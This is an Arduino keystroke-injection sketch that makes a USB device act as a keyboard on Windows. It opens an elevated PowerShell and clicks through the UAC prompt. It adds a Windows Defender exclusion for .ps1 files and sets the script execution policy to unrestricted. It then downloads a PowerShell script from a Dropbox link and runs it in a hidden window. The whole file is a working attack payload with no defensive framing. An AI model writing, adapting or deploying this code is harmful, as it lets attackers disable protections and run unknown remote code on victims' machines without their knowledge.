#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard
  
  Keyboard.begin();
  
  delay(2500);

  // Windows + D = minimize all apps
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Start powershell ad Admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);
  
  // Go to C:\Users\Public\Documents directory

  Keyboard.print("cd C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");

  typeKey(KEY_RETURN);  
  
  // Add exception in antivirus for ps1 extension

  Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");

  typeKey(KEY_RETURN);
  
  // Allows all script to be executed on pc

  Keyboard.print("Set-ExecutionPolicy unrestricted -Force");

  typeKey(KEY_RETURN);
  
  // Download main script

  Keyboard.print("wget https://www.dropbox.com/s/f4omlmphgin74ie/ciaoV2.ps1?raw=1 -OutFile ciaoV2.ps1");

  typeKey(KEY_RETURN);

  delay(3500);
  
  // Start main script
  
  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
